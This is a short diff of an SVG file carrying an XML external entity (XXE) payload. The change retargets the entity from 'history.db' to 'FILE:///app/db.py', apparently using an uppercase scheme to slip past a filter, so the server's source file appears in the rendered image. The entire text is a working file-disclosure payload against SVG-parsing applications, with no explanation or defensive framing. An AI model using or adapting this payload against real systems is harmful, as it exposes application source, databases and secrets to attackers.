@@ -1,6 +1,6 @@
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE svg [
-    <!ENTITY xxe SYSTEM "history.db">
+    <!ENTITY xxe SYSTEM "FILE:///app/db.py">
 ]>
 <svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
     <text x="10" y="20">&xxe;</text>
